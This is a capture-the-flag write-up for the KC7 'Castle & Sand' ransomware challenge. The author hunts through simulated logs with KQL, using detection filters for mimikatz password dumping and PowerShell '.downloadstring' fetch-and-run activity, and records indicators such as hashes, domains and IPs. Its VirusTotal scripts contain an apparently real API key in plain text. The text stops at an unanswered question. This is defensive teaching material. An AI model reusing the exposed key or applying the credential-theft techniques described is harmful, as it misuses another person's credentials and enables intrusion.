# Castle & Sand

## Pre

Challenge URL: [Castle & Sand](https://kc7cyber.com/challenges/54#)

## Section 1: KQL 101 🧰

Skipped...

[Official Writeup](https://github.com/KC7-Foundation/kc7_data/blob/main/Castle%26Sand/castleandsand.com.md)

## Section 2: Shark Attack! 🦈

### 1: What email address did the threat actor provide to Castle&Sand to communicate with them? 

The picture gives us backstory of the attack, and the image includes attackers email at the bottom for proof of concept and communication.

[Ransomware Note](https://kc7photos.blob.core.windows.net/manualphotos/sharknado_ransom.png)

::: tip Flag
`sharknadorules_gang@onionmail.org`
:::

### 2: What is the unique decryption ID?

Retrieved from the note.

::: tip Flag
`SUNNYDAY123329JA0`
:::
 
### 3: Should this be something you post publicly about? Yes or no?

Publicly disclosing the ransomware is never a good idea, especially if this happens in company environment. The **sensitive** data which belong to organization cannot be disclosed to public, its your job as a SoC to protect that information from attackers.

::: tip Flag
`No`
:::

### 4: How many notes appeared in Castle&Sand's environment?

_The ransom note filename was called "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt."_

```sql
FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname
| count 
```

::: tip Flag
`774`
:::

### 5: How many distinct hostnames had the ransom note?

Same answer as in Question 4

::: tip Flag
`774`
:::

### 6: How many distinct employee roles were affected by the ransomware attack?

**[let](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/let-statement)** operator.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
Employees
| where hostname in (infectedHosts)
| distinct role
| count 
```

::: tip Flag
`18`
:::

### 7: How many unique hostnames belong to IT employees?

From Question 6 we found the infected machine roles and only 1 role corresponds to IT.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
Employees
| where hostname in (infectedHosts)
| where role == 'IT Helpdesk'
| count 
```

::: tip Flag
`25`
:::

### 8: One of the IT employees has their IP address ending in 46. What's their name?

```sql
Employees
| where role == 'IT Helpdesk'
| where ip_addr endswith ".46"
```

::: tip Flag
`Simeon Kakpovi`
:::

### 9: How many security alerts involved the different hosts?

In `SecurityAlerts` table there isnt distinct column for hostname. Description contains hostnames and [has_any](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/has-any-operator) operator can be used to check for multiple strings.

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (infectedHosts)
| count 
```

::: tip Flag
`652`
:::

### 10: How about just the unique hostnames belonging to the IT Helpdesk from Question 7?

1. Filter for infected hosts
2. Filter for IT employee hostnames
3. Check security alerts for IT hostnames

```sql
let infectedHosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let infectedHostsIT = Employees
| where role == 'IT Helpdesk'
| where hostname in (infectedHosts)
| project hostname;
SecurityAlerts
| where description has_any (infectedHostsIT)
| count 
```

::: tip Flag
`27`
:::

### 11: Who owns the machine that flagged on that alert? 

_(provide their name)_

Most description in the _previous query_ looks the same, but if we filter against `suspicious` we can identify the malicious file. 

```sql
| where not(description has 'A suspicious file was detected on host')
```

Find employee name.

```sql
Employees
| where hostname == '6S7W-MACHINE'
| project name
```

::: tip Flag
`Preston Lane`
:::

### 12: When did the file appear on that user's machine? 

_copy and paste the full timestamp_

```sql
FileCreationEvents
| where hostname == '6S7W-MACHINE'
| where filename == 'Chomping-Schedule_Changes.xlsx'
```

::: tip Flag
`2023-05-26T09:26:15Z`
:::

### 13: What's the SHA256 hash of that file?

Question 12 query, sha256.

::: tip Flag
`71daa56c10f7833848a09cf8160ab5d79da2dd2477b6b3791675e6a8d1635016`
:::

### 14: What application created that file?

Question 12 query, `process_name`.

::: tip Flag
`Firefox` or `firefox.exe`
:::

### 15: Let's look for other files with that same name. How many unique hosts had that file on their systems?

```sql
FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname
| count 
```

::: tip Flag
`11`
:::

### 16: How many unique domains did employees download this file from?

```sql
OutboundNetworkEvents
| where url has 'Chomping-Schedule_Changes.xlsx'
| distinct url
```

```bash
https://jawfin.com/published/images/files/Chomping-Schedule_Changes.xlsx
http://sharkfin.com/modules/public/published/Chomping-Schedule_Changes.xlsx
```

::: tip Flag
`2`
:::

### 17: Based on the employee we've been tracking from Question 11, which domain did they download the file from?

```sql
let employeeIP = Employees
| where hostname == '6S7W-MACHINE'
| project ip_addr;
OutboundNetworkEvents
| where src_ip == toscalar(employeeIP)
| where url has 'Chomping-Schedule_Changes.xlsx'
| project parse_url(url).Host
```

::: tip Flag
`jawfin.com`
:::

### 18: How many unique IP addresses did the domain resolve to?

```sql
PassiveDns
| where domain == 'jawfin.com'
| distinct ip
| count  
``` 

::: tip Flag
`6`
:::

### 19: Which IP address is closest to when the employee had the file created on their host machine?

1 IP appears 2 times within ~5days frame

```sql
let fileCreatedAt = toscalar(FileCreationEvents
| where hostname == '6S7W-MACHINE'
| where filename == 'Chomping-Schedule_Changes.xlsx'
| project timestamp);
PassiveDns
| where domain == 'jawfin.com'
| sort by timestamp 
| evaluate rows_near(timestamp >= fileCreatedAt, 1)
| extend fileCreatedAt
```

::: tip Flag
`193.248.75.126`
:::

### 20: How many unique IPs did that domain resolve to?

_There was another domain found from Q16._

```sql
PassiveDns
| where domain == 'sharkfin.com'
| distinct ip
``` 

::: tip Flag
`4`
:::

### 21: Let's take all of the IP addresses from the two domains and search them against network events on Castle&Sand's website. How many records returned from your query?

We can take known domains, get unique ips and filter `InboundNetworkEvents` for incoming requests from those ips. 

```sql
let susIPs = PassiveDns
| where domain in ('sharkfin.com', 'jawfin.com')
| distinct ip;
InboundNetworkEvents
| where src_ip in (susIPs)
| count 
```

::: tip Flag
`39`
:::

### 22: When was the first time we saw any of these actor IP addresses from Q21 against Castle&Sand's network?

Replace Question 21 query `count` to `take 1` for first event. (Database is already sorted with timestamps)

::: tip Flag
`2023-05-20T03:11:57Z`
:::

### 23: Let's search the actor IPs against AuthenticationEvents to see if they logged into any user machines or email accounts. How many records did you get back?

```sql
let susIPs = PassiveDns
| where domain in ('sharkfin.com', 'jawfin.com')
| distinct ip;
AuthenticationEvents
| where src_ip in (susIPs)
```

::: tip Flag
`0`
:::

### 24: Let's look for the malicious domains in Emails. How many records did you get back?

```sql
Email
| where parse_url(link).Host in ('sharkfin.com', 'jawfin.com')
| count 
```

::: tip Flag
`14`
:::

### 25: When was the earliest email sent?

Replace Question 24 query `count` to `take 1` for first event. (Database is already sorted with timestamps)

::: tip Flag
`2023-05-25T16:33:09Z`
:::

### 26: Who was the sender?

Question 25 has the answer.

::: tip Flag
`legal.sand@verizon.com`
:::

### 27: How many emails total did that sender send to Castle&Sand employees?

```sql
Email
| where sender == 'legal.sand@verizon.com'
| where recipient endswith 'castleandsand.com'
| count 
```

::: tip Flag
`23`
:::

### 28: Take all of the distinct sender or reply_to emails from the last question. How many emails total are associated with these email addresses?

We already know `sender` and we can use same query to get `distinct reply_to`

```sql
let maliciousSender = 'legal.sand@verizon.com';
Email
| where sender == maliciousSender
| where recipient endswith 'castleandsand.com'
| distinct reply_to 
```

I wasn't able to figure out a graceful way to join 2 columns into 1, so I just created list variable using [dynamic](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/scalar-data-types/dynamic) data type.

Using `or` 

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
Email
| where sender in (emails) or reply_to in (emails)
| count 
```

::: tip Flag
`40`
:::

### 29: How many unique domains did the email addresses use in their emails?

Same query from Question 28, but instead of 
```sql
| count
```
--->
```sql
| distinct tostring(parse_url(link).Host)
```

::: tip Flag
`6`
:::

### 30: How many distinct IP addresses total were used by all of the domains identified in Q28?

Question should mention Q29? 🤔

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let domains = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_url(link).Host);
PassiveDns
| where domain in (domains)
| distinct ip
| count 
```

::: tip Flag
`15`
:::

### 31: How many user accounts did these IPs log into?

The sql is getting longer and longer, we just need to check previous query results IPs in `AuthenticationEvents` for login attempts.

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let domains = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_url(link).Host);
let ips = PassiveDns
| where domain in (domains)
| distinct ip;
AuthenticationEvents
| where src_ip in (ips)
```

::: tip Flag
`0`
:::

### 32: Looking at these emails (from question 31), how many unique filenames were served by these domains?

Question should mention Q28 for emails? 🤔

[parse_path](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/parse-path-function) function is useful in this case for extracting the filenames.

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_path(link).Filename)
```
 
::: tip Flag
`5`
:::

### 33: How many files with these names were created on employee host machines?

Extend query from Question32 and get distinct machine hostnames.

```sql
FileCreationEvents
| where filename in (Q32Output)
| distinct hostname
| count 
```

::: tip Flag
`34`
:::

### 34: When was the first file observed?

For some reason the database wasn't sorted so add that condition.

```sql
FileCreationEvents
| where filename in (Q32Output)
| order by timestamp asc 
| take 1
```

::: tip Flag
`2023-05-25T16:43:20Z`
:::

### 35: How many records total are associated with the identified host machines from Q33?

The sql chain getting longer and longer...

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
let Q32Output = Email
| where sender in (emails) or reply_to in (emails)
| distinct tostring(parse_path(link).Filename);
let Q33Output = FileCreationEvents
| where filename in (Q32Output)
| distinct hostname;
ProcessEvents
| where hostname in (Q33Output)
| count 
```

::: tip Flag
`16391`
:::

### 36: How many records total do you have now?

_Using your query from Q35, set a new query where the timestamp is greater than the first time you saw the file in Q34._

We can add one more filter

```sql
| where timestamp > datetime(2023-05-25T16:43:20Z)
```

::: tip Flag
`5818`
:::

### 37: What IP address is referenced in that command?

_Let's look at the first few records. There's some suspicious powershell activity that occurs near the beginning._

We can filter `process_commandline` for only `powershell` commands and we can also filter against commands that start with `C:` (absolute path), because users usually run commands with relative path.

```sql
ProcessEvents
| where hostname in (Q33Output)
| where timestamp >= datetime(2023-05-25T16:43:20Z)
| where process_commandline has 'powershell'
| where not(process_commandline has 'C:')
| order by timestamp asc
| project process_commandline
```

Weird thing happened in this query, `project process_commandline` decided that it would sort the results on its own? that's why `order by` is necessary with `project` in this query..

::: tip Flag
`220.35.180.137`
:::

### 38: Which host machine did the powershell activity execute on?

We found it from Question 37 query (first event). 

::: tip Flag
`CL8Q-LAPTOP`
:::

### 39: There's a weird repeating command right before this activity. What's the parent process of the first time this repeated activity occurs?

Filter for events till the previous query's answer and then count parent process names.

```sql
ProcessEvents
| where hostname == 'CL8Q-LAPTOP'
| where timestamp <= datetime('2023-05-25T18:28:02Z')
| summarize count() by parent_process_name
```

The results look normal? All listed processes seem legit, but **[scvhost.exe](https://www.wikiwand.com/en/Svchost.exe)** seems a bit weird. <br>
First of all if you're windows user you probably checked `Task Manager > Details` tab and would have seen bijilion of this programs running for whatever reason... and if we take a closer look we can notice that it's _s**cv**host_ not _s**vc**host_. Sussy indeed 👀

::: tip Flag
`scvhost.exe`
:::

### 40: What legitimate Windows process was this file trying to masquerade as?

Discussed in Question 39

::: tip Flag
`svchost.exe`
:::

### 41: How many hosts had their passwords dumped?

The most popular tool for dumping password on Windows machine is, of course without saying, **[mimikatz](https://github.com/ParrotSec/mimikatz)**. 

We can filter for common keyword to identify the process if we are not 100% certain.

```sql
ProcessEvents
| where hostname == 'CL8Q-LAPTOP'
| where process_commandline contains 'password'
```

```sql
ProcessEvents
| where process_name == 'mimikatz.exe'
| distinct hostname
| count 
```

> If you tried `process_commandline has 'mimikatz'` then you would have noticed extra 4 events, which for this question is not revelant.

::: tip Flag
`31`
:::

### 42: How many hosts did that powershell command execute on?

_Let's go back to the powershell activity Q37._

From Question 37 we saw PowerShell command is downloading a script from the specified URL and executing it in a hidden mode without loading the user profile.

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| distinct hostname
| count 
```

::: tip Flag
`31`
:::

### 43: How many unique IP addresses were used in these commands?

To get unique IPs first we have to extract them from `process_commandline`. The proccess is very simple using [RegEx](https://www.wikiwand.com/en/Regular_expression).<br>
**[extract](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/extract-function)** function allows us to specify the 1) pattern, 2) group to select, 3) from where.

If RegEx pattern seems scary, just know that it's simple IP matcher, `[0-9]+.` -> `123.` repeated 3 times + `[0-9]` -> 123.<br>
I wont dive into [regular expressions](https://media.dev.to/cdn-cgi/image/width=1080,height=1080,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fi%2F3umga1qn8k7lwrr1ltw8.png), but its very powerful tool to know.

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| distinct attackerIP = extract('(([0-9]+.){3}[0-9]+)', 1, process_commandline)
| count 
```

::: tip Flag
`14`
:::

### 44: Which of these IP addresses was seen the most?

Almost same query, but with **[count](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/count-aggregation-function)** function.<br>
To make it easier to identify the most repeated IP we can utilize **[sort/order by](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/sort-operator)** function

```sql
ProcessEvents
| where process_commandline has '.downloadstring'
| project attackerIP = extract('(([0-9]+.){3}[0-9]+)', 1, process_commandline)
| summarize count() by attackerIP
| order by count_ desc
```

> KQL automatically names columns and for count it's `count_`

::: tip Flag
`157.242.169.232`
:::

### 45:  How many records total involved those processes?

_Take the parent processes from Q42._

```sql
let Q42ParentProcessHashes = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_hash;
ProcessEvents
| where parent_process_hash in (Q42ParentProcessHashes)
| count 
```

::: tip Flag
`62`
:::

### 46: Let's look to see if any of these files are referenced in the command line. How many records did you find?

`these files` means the `parent_process_names` from Question 42.

```sql
let files = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (files)
| count 
```

::: tip Flag
`1548`
:::

### 47: When was the earliest time found in Q46?

`| count` -> `| take 1 | project timestamp` from Question 47.

::: tip Flag
`2023-06-09T19:43:58Z`
:::

### 48: When was the earliest time you saw these files?

_You remember that the encrypted files all had the extension '.sharkfin'. Search for that in created files._

```sql
FileCreationEvents
| where filename endswith ".sharkfin"
| order by timestamp asc 
| take 1
```

::: tip Flag
`2023-06-09T19:43:48Z`
:::

## Section 3: Hunting the Shark 🔍

### 1: How many hours does Castle&Sand have before the gang releases the information? 

_Link to voicemail: <https://twitter.com/webyteyourdata/status/1665825830495219713>_

::: tip Flag
`72`
:::

### 2: What do the ransomware gang call themselves?

The answer is in Voice mail (~10 seconds) or #tag.

::: tip Flag
`Shark boys`
:::

### 3: What Mitre Technique is aligned with what this group did on Castle&Sand systems?

**[T1486](https://attack.mitre.org/techniques/T1486/)**: Data Encrypted for Impact.

> _Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key._

::: tip Flag
`T1486`
:::

### 4: Let's search for the email domain used in the ransom note. What is the ZIP code of their headquarters?

Some **[OSINT](https://www.imperva.com/learn/application-security/open-source-intelligence-osint/)** required for this task. First let's go back some:<br>
Flashback To Section 2 Question 1: _[Ransomeware Note](https://kc7photos.blob.core.windows.net/manualphotos/sharknado_ransom.png)_

We find the domain of the email the attackers used in the Ransom Note. After that we can go to the official website and search for the answer.<br>
For address we can refer to **Privacy Policy** page and then **Contacting us** header.

::: tip Flag
`10016`
:::

### 5: What country is this email service located in?

We learned it from Question 4.

::: tip Flag
`USA`
:::

### 6: How many continents total are these IP addresses from?

* Let's look at the IP addresses from Section 2, Q18 using MaxMind GeoIP2. 
* You can use a service like MaxMind GeoIP here: <https://www.maxmind.com/en/geoip-demo>

> _**GeoIP**_ is a technique allowing to locate a web user based on their IP address.

```sql
PassiveDns
| where domain == 'jawfin.com'
| distinct ip
```

We can use given website to do GeoIP lookup for found (6) IPs, filter for **distinct continents** for answer.

> If you have AdBlocker enabled the service may not work

::: tip Flag
`3`
:::

### 7: What is the Autonomous System (AS) number for the IP address?

_Use <https://search.censys.io> to look up the IP address found in Section 2, Q19._

```sql
193.248.75.126
```

**[ASN](https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/)** stands for Autonomous System Number. Imagine the internet as a giant network of highways. ASNs are like IDs for different highway authorities, each managing their own section. An AS can be an internet service provider (ISP), a large company, or even a government agency.

These authorities (ASNs) decide how traffic flows within their networks and how to connect to other highways (ASNs). This keeps the internet running smoothly and efficiently. There's a central registry to avoid confusion, ensuring each highway authority (ASN) has a unique ID.

-- For answer just submit the IP (from Section 2, Question 19) to given website

::: tip Flag
`AS3215`
:::

### 8: Which one is assigned to a University?

_Look at the IPs from Section 2, Q20._

```sql
PassiveDns
| where domain == 'sharkfin.com'
| distinct ip
```

We can utilize **[MaxMind GeoIP](https://www.maxmind.com/en/geoip-demo)** again to identify source of ips, only 1 IP belong to University.

::: tip Flag
`157.242.169.232`
:::

### 9: Which email address is associated with a company outside of the United States?

_Look at the emails from Section 2, Q28._

```sql
let emails = dynamic([
    'legal.sand@verizon.com',
    'castle@hotmail.com',
    'legal.sand@verizon.com',
    'urgent_urgent@yandex.com'
]);
```

If you already don't know this company, you can look each one to learn more about them.

::: tip Flag
`urgent_urgent@yandex.com`
:::

### 10: For the tool found in Section 2, Q41, What is the MITRE ID for that specific software?

[Mimikatz, Software S0002](https://attack.mitre.org/software/S0002/)

::: tip Flag
`S0002`
:::

### 11: For the tool found in Section 2, Q41, what is the MITRE ID for that that type of technique that this tool is typically used for?

We know that attackers used this program to dump credentials of users, so we can lookup `Techniques Used` table for ID referencing this attack's **ID**.

::: tip Flag
`T1003`
:::

### 12: How many unique SHA256 hashes are found in Castle&Sand's environment with these filenames?

_Take the filenames from Section 2, Q45._

```sql
let Q42ParentProcessHashes = ProcessEvents
| where process_commandline has '.downloadstring'
| distinct parent_process_hash;
let Q45ProcessNames = ProcessEvents
| where parent_process_hash in (Q42ParentProcessHashes)
| distinct parent_process_name; // From Q45
FileCreationEvents              // New Lines For Query
| where filename in (Q45ProcessNames)
| distinct sha256
| count 
```

::: tip Flag
`9`
:::

### 13: How many were flagged as malicious on VirusTotal?

I didn't want to go through the VirusTotal 1 by 1, so I just wrote a small script to grab relevant data.

[**VirusTotal**: API Docs](https://docs.virustotal.com/reference/overview): [File Info](https://docs.virustotal.com/reference/file-info)

::: details virustotal_file.py
```python
import requests

URL = 'https://www.virustotal.com/api/v3/files/' 
HEADERS = { 'x-apikey': '1edf0047d0c03046cfa06936cd7c60343cb5f2fdd777eae3452ecfc899fe9707' }
RESULT = '''
Hash: %s
Meaningful Name: %s
Popular Thread Label: %s
Malicious: %d / %d
'''.lstrip()
NOT_FOUND = '<Not Found>'

hashes = [
    '28a181e8ebeda37943d17366eee83a5b677252891be6b4889c6a94f7e4b22671',
    '3e6c4e97cc09d0432fbbbf3f3e424d4aa967d3073b6002305cd6573c47f0341f',
    '9d1d090ca4fca82b66ac3731c133fe6e8e1be331cfd6d6e378cebaede5afe006',
    'c51c5bbc6f59407286276ce07f0f7ea994e76216e0abe34cbf20f1b1cbd9446d',
    'f822ef47a30b07308f1fa0e2dc261ebec77d0d173b0afaa27635b6511771a454',
    '5d971ed3947597fbb7e51d806647b37d64d9fe915b35c7c9eaf79a37b82dab90',
    'bb3d35cba3434f053280fc2887a7e6be703505385e184da4960e8db533cf4428',
    '63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7',
    'e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496',
    '490c3e4af829e85751a44d21b25de1781cfe4961afdef6bb5759d9451f530994',
    '35ca10384a75de18555c5bf5265e2959ee7d65c4b9e21e0764c853949e777c38',
    '276f0c96b3d75afdf7ef899890a52db22242121c89c96bb97712a97aee043ea1',
]
for hash_ in hashes:
    resp = requests.get(URL + hash_, headers=HEADERS).json()
    if 'error' in resp:
        print(resp)
        print()
        continue
    resp = resp['data']['attributes']
    name = resp.get('meaningful_name', NOT_FOUND)
    threat_label = resp.get('popular_threat_classification', {}).get('suggested_threat_label', NOT_FOUND)
    stats = sum(resp['last_analysis_stats'].values())
    malicious = resp['last_analysis_stats']['malicious']
    
    print(RESULT % (hash_, name, threat_label, malicious, stats))
```
:::

```bash
Hash: d18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0
Meaningful Name: kerbrute_windows_amd64.exe
Popular Threat Label: trojan.kerbrute/rorschach
Malicious: 45 / 76

Hash: af99dea461d36b775235a107c7ea94a2b457851ef62d0ed6f0c50fb5131c8c8b
Meaningful Name: <Not Found>
Popular Threat Label: trojan.dllhijack/jocvw
Malicious: 45 / 75

Hash: 4874d336c5c7c2f558cfd5954655cacfc85bcfcb512a45fb0ff461ce9c38b86d
Meaningful Name: cydump.exe
Popular Threat Label: <Not Found>
Malicious: 0 / 73

Hash: 21ff279ba30d227e32e63cb388bf8c2d21c4fd7e935b3087088579b29e56d81d
Meaningful Name: <Not Found>
Popular Threat Label: trojan.dllhijack/darkloader
Malicious: 45 / 76

Hash: b99d114b267ffd068c3289199b6df95a9f9e64872d6c2b666d63974bbce75bf2
Meaningful Name: config.ini
Popular Threat Label: trojan.rorschach/bablock
Malicious: 30 / 74

Hash: 7ef2cc079afe7927b78be493f0b8a735a3258bc82801a11bc7b420a72708c250
Meaningful Name: scvhost_chi.exe
Popular Threat Label: ransomware.chisel/rorschach
Malicious: 44 / 76

Hash: aa48acaef62a7bfb3192f8a7d6e5229764618ac1ad1bd1b5f6d19a78864eb31f
Meaningful Name: 88167052a74057a93e12673599451baa
Popular Threat Label: trojan.dllhijack/rorschach
Malicious: 47 / 75

Hash: f77077777b0cd9edd693b87cbaaaefe73436395192a2b77a841b2d5bd9b088e8
Meaningful Name: config.ini
Popular Threat Label: trojan.rorschach/lockbit
Malicious: 28 / 76

Hash: 82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180
Meaningful Name: config.ini
Popular Threat Label: trojan.rorschach/lockbit
Malicious: 28 / 76
```

::: tip Flag
`3`
:::

### 14: Which file hash was reported by the security community as the ransomware's encrypted payload?

VirusTotal Docs: [Get comments on a file](https://docs.virustotal.com/reference/files-comments-get)

Same as last question, but grabbed first line of comments.

::: details virustotal_comment.py
```python
import requests

URL = 'https://www.virustotal.com/api/v3/files/%s/comments'
HEADERS = { 'x-apikey': '1edf0047d0c03046cfa06936cd7c60343cb5f2fdd777eae3452ecfc899fe9707' }

hashes = [
    'd18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0',
    'af99dea461d36b775235a107c7ea94a2b457851ef62d0ed6f0c50fb5131c8c8b',
    '4874d336c5c7c2f558cfd5954655cacfc85bcfcb512a45fb0ff461ce9c38b86d',
    '21ff279ba30d227e32e63cb388bf8c2d21c4fd7e935b3087088579b29e56d81d',
    'b99d114b267ffd068c3289199b6df95a9f9e64872d6c2b666d63974bbce75bf2',
    '7ef2cc079afe7927b78be493f0b8a735a3258bc82801a11bc7b420a72708c250',
    'aa48acaef62a7bfb3192f8a7d6e5229764618ac1ad1bd1b5f6d19a78864eb31f',
    'f77077777b0cd9edd693b87cbaaaefe73436395192a2b77a841b2d5bd9b088e8',
    '82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180',
]
for hash_ in hashes:
    resp = requests.get(URL % hash_, headers=HEADERS).json()
    print(f'\nHash: {hash_}')
    for i, comment in enumerate(resp['data'], start=1):
        comment = comment['attributes']['text']
        comment_first_line = comment.split('\n')[0]
        print(f'Comment {i}: {comment_first_line}')
```
:::

```bash
Hash: d18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0
Comment 1: YARA Signature Match - THOR APT Scanner

Hash: af99dea461d36b775235a107c7ea94a2b457851ef62d0ed6f0c50fb5131c8c8b
Comment 1: #BabLock #Ransomware Loader
Comment 2: YARA Signature Match - THOR APT Scanner

Hash: 4874d336c5c7c2f558cfd5954655cacfc85bcfcb512a45fb0ff461ce9c38b86d
Comment 1: Clean Tool, but used as transport vector by Rorschach
Comment 2: Cortex XDR tool being used by ransomware.
Comment 3: This indicator was mentioned in a report.
Comment 4: side-loading issue
Comment 5: Joe Sandbox Analysis:

Hash: 21ff279ba30d227e32e63cb388bf8c2d21c4fd7e935b3087088579b29e56d81d
Comment 1: YARA Signature Match - THOR APT Scanner
Comment 2: #BabLock #Ransomware Loader

Hash: b99d114b267ffd068c3289199b6df95a9f9e64872d6c2b666d63974bbce75bf2
Comment 1: #BabLock Ransomware
Comment 2: #Unknown ransomware, encrypted shellcode with payload

Hash: 7ef2cc079afe7927b78be493f0b8a735a3258bc82801a11bc7b420a72708c250
Comment 1: YARA Signature Match - THOR APT Scanner
Comment 2: YARA Signature Match - THOR APT Scanner
Comment 3: YARA Signature Match - THOR APT Scanner

Hash: aa48acaef62a7bfb3192f8a7d6e5229764618ac1ad1bd1b5f6d19a78864eb31f
Comment 1: #BabLock Ransomware, DLL side loading
Comment 2: Joe Sandbox Analysis:
Comment 3: #Unknown ransomware, DLL side loading

Hash: f77077777b0cd9edd693b87cbaaaefe73436395192a2b77a841b2d5bd9b088e8
Comment 1: #BabLock #Ransomware encrypted payload

Hash: 82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180
Comment 1: #BabLock #Ransomware encrypted payload
```

> For some reason only last hash was accepted 🥴

::: tip Flag
82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180
:::

### 15: What ransomware family uses a command similar to this process execution?

_For Section 2, Q46_

We learned about this from Question 13/14 (has more then 1 name).

::: tip Flag
`Bablock` or `Rorschach`
:::

## Section 4: Sand in my 👁️👁️ (New Threat Actor)

### 1: How many emails were sent from this email to Castle&Sand employees?
 
```sql
let email = 'castleandsand_official@outlook.com'; // Given from question
Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct recipient
| count  
```

::: tip Flag
`19`
:::

### 2: There appears to be another email account. How many emails total are referenced by these two email accounts?

We also have a `reply_to` in emails, filtering for distinct emails we get 2. After that we can filter for communication for those emails.

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
Email
| where sender in (replyToEmails)
| count 
```

::: tip Flag
`33`
:::

### 3: How many unique domains were used by these email accounts?

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
Email
| where sender in (replyToEmails)
| distinct tostring(parse_url(link).Host)
```

::: tip Flag
`4`
:::

### 4: Based on these domains, what type of attack did this threat actor conduct?

First let's observe what happened.<br>
If we filter `OutboundNetworkEvents` for known domains we see a weird behavior, the domains are mainly in `http://link?redirect=domain`. Similar behavior was observed in `Balloons Over Iowa` room.<br>

```sql
let domains = dynamic([
    'keywordssurfparadise.com',
    'beachlifestylestore.com',
    'sunandcastletrading.com',
    'sandsurfinggear.com'
]);
OutboundNetworkEvents
| where url has_any (domains)
```

Now let's see what happens after redirect. <br>
Redirections seem to be initiated from legitimate websites and ends up on malicious domain with file download. This attack is known as **[Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)** or **Watering Hole Attack**.

```sql
let domains = dynamic([
    'keywordssurfparadise.com',
    'beachlifestylestore.com',
    'sunandcastletrading.com',
    'sandsurfinggear.com'
]);
OutboundNetworkEvents
| where url has_any (domains)
| serialize 
| evaluate rows_near(url has '?redirect', 1, 0)
```

::: tip Flag
`watering hole`
:::

### 5: How many distinct job roles were targeted by this type of attack?

Continuing the query from Question 3.

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)
| distinct recipient;
Employees
| where email_addr in (affectedEmails)
| distinct role
| count 
```

::: tip Flag
`13`
:::

### 6: How many external IP addresses were used to successfully log into those user accounts?

_Let's take the targeted employees and look for all external IP addresses that authenticated to those users._

Chain the previous query with current one and filter `AuthenticationEvents` for login events.
1. Get affected employee usernames
2. Filter out local ips (which belong to employees)
3. Only get effected employees.
4. Get successful logins
5. Get distict remote IPs

```sql
let email = 'castleandsand_official@outlook.com';
let replyToEmails = Email
| where sender == email
| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)
| distinct recipient;
let affectedEmployees = Employees
| where email_addr in (affectedEmails)
| distinct username; // 1.
AuthenticationEvents
| where not( src_ip in (Employees | distinct ip_addr) ) // 2.
| where username in (affectedEmployees) // 3.
| where result == 'Successful Login' // 4.
| distinct src_ip // 5.
| count 
```

::: tip Flag
`43`
:::

### 7: These IP addresses may have accessed email inboxes and downloaded data. How many unique filenames were downloaded by these IP addresses?

We need to look inside `InboundNetworkEvents` table, because the attackers got inside the machines and probably downloaded the malicious files.

